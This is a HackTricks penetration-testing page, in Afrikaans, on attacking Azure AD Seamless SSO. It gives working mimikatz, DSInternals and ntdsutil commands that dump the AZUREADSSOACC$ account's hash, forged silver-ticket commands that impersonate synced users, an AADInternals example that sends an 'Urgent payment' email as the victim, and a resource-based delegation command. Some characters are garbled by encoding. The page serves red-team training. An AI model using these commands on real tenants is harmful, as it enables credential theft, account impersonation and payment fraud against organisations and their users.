# Az - Naadloos SSO

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Basiese Inligting

[Volgens die dokumentasie:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso) Azure Active Directory Naadloos Enkeltekenaanmelding (Azure AD Seamless SSO) teken gebruikers outomaties in wanneer hulle op hul korporatiewe toestelle is wat aan jou korporatiewe netwerk gekoppel is. Wanneer dit geaktiveer is, hoef gebruikers nie hul wagwoorde in te tik om by Azure AD aan te meld nie, en gewoonlik hoef hulle selfs nie hul gebruikersname in te tik nie. Hierdie funksie bied jou gebruikers maklike toegang tot jou wolkgebaseerde toepassings sonder om enige addisionele on-premises komponente te benodig.

<figure><img src="../../../../.gitbook/assets/image (7) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Basies teken Azure AD Naadloos SSO gebruikers in wanneer hulle op 'n on-prem domein-gekoppelde rekenaar is.

Dit word ondersteun deur beide [**PHS (Password Hash Sync)**](phs-password-hash-sync.md) en [**PTA (Pass-through Authentication)**](pta-pass-through-authentication.md).

Desktop SSO gebruik **Kerberos** vir outentisering. Wanneer dit gekonfigureer is, skep Azure AD Connect 'n rekenaarrekening genaamd AZUREADSSOACC`$` in die on-prem AD. Die wagwoord van die `AZUREADSSOACC$`-rekening word **as plain-text na Azure AD gestuur** tydens die konfigurasie.

Die **Kerberos-kaartjies** word **ge√´nkripteer** met die **NTHash (MD4)** van die wagwoord en Azure AD gebruik die gestuurde wagwoord om die kaartjies te ontsluit.

**Azure AD** stel 'n **eindpunt** (https://autologon.microsoftazuread-sso.com) bloot wat Kerberos-kaartjies aanvaar. Die blaaier van 'n domein-gekoppelde masjien stuur die kaartjies na hierdie eindpunt vir SSO.

### On-prem -> wolk

Die **wagwoord** van die gebruiker **`AZUREADSSOACC$` verander nooit**. Daarom kan 'n domein-admin die **hash van hierdie rekening** in gevaar bring en dit dan gebruik om silwer-kaartjies te skep om met **enige on-prem-gebruiker wat gesinkroniseer is** na Azure te verbind:
```powershell
# Dump hash using mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\azureadssoacc$ /domain:domain.local /dc:dc.domain.local"'
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit

# Dump hash using https://github.com/MichaelGrafnetter/DSInternals
Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain contoso -Server lon-dc1.contoso.local

# Dump using ntdsutil and DSInternals
## Dump NTDS.dit
ntdsutil "ac i ntds" "ifm‚Äù "create full C:\temp" q q
## Extract password
Install-Module DSInternals
Import-Module DSInternals
$key = Get-BootKey -SystemHivePath 'C:\temp\registry\SYSTEM'
(Get-ADDBAccount -SamAccountName 'AZUREADSSOACC$' -DBPath 'C:\temp\Active Directory\ntds.dit' -BootKey $key).NTHash | Format-Hexos
```
Met die has kan jy nou **silwer kaartjies genereer**:
```powershell
# Get users and SIDs
Get-AzureADUser | Select UserPrincipalName,OnPremisesSecurityIdentifier

# Create a silver ticket to connect to Azure with mimikatz
Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin /sid:S-1-5-21-123456789-1234567890-123456789 /id:1105 /domain:domain.local /rc4:<azureadssoacc hash> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'
mimikatz.exe "kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:12349e088b2c13d93833d0ce947676dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit

# Create silver ticket with AADInternal to access Exchange Online
$kerberos=New-AADIntKerberosTicket -SidString "S-1-5-21-854168551-3279074086-2022502410-1104" -Hash "097AB3CBED7B9DD6FE6C992024BC38F4"
$at=Get-AADIntAccessTokenForEXO -KerberosTicket $kerberos -Domain company.com
## Send email
Send-AADIntOutlookMessage -AccessToken $at -Recipient "someone@company.com" -Subject "Urgent payment" -Message "<h1>Urgent!</h1><br>The following bill should be paid asap."
```
Om die silwerkaart te gebruik, moet die volgende stappe uitgevoer word:

1. **Begin die Blaaier:** Mozilla Firefox moet geopen word.
2. **Konfigureer die Blaaier:**
- Navigeer na **`about:config`**.
- Stel die voorkeur vir [network.negotiate-auth.trusted-uris](https://github.com/mozilla/policy-templates/blob/master/README.md#authentication) in op die gespesifiseerde [waardes](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso#ensuring-clients-sign-in-automatically):
- `https://aadg.windows.net.nsatc.net`
- `https://autologon.microsoftazuread-sso.com`
3. **Toegang tot die Webtoepassing:**
- Besoek 'n webtoepassing wat ge√Øntegreer is met die organisasie se AAD-domein. 'n Algemene voorbeeld is [Office 365](https://portal.office.com/).
4. **Verifikasieproses:**
- Voer die gebruikersnaam in by die aanmeldingskerm en laat die wagwoordveld leeg.
- Druk TAB of ENTER om voort te gaan.

{% hint style="success" %}
Dit omseil nie MFA as dit geaktiveer is nie.
{% endhint %}

#### ~~Skep van Kerberos-kaartjies vir slegs-wolkkli√´nte~~ <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

As die Active Directory-administrateurs toegang het tot Azure AD Connect, kan hulle **SID vir enige wolk-gebruiker instel**. Op hierdie manier kan Kerberos-kaartjies ook vir slegs-wolkkli√´nte geskep word. Die enigste vereiste is dat die SID 'n korrekte [SID](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc778824\(v=ws.10\)) is.

{% hint style="danger" %}
Die verandering van SID van slegs-wolk-admin-gebruikers word nou **geblokkeer deur Microsoft**.\
Vir inligting, besoek [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
{% endhint %}

### On-prem -> Wolk via Hulpbron-Gebaseerde Beperkte Delegasie <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

Enige persoon wat rekenaarrekeninge (`AZUREADSSOACC$`) in die houer of OU kan bestuur waarin hierdie rekening is, kan **'n hulpbron-gebaseerde beperkte delegasie oor die rekening instel en dit toegang**.
```python
python rbdel.py -u <workgroup>\\<user> -p <pass> <ip> azureadssosvc$
```
## Verwysings

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso)
* [https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [TR19: Ek is in jou wolk, lees almal se e-posse - hack Azure AD via Active Directory](https://www.youtube.com/watch?v=JEIR5oGCwdg)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
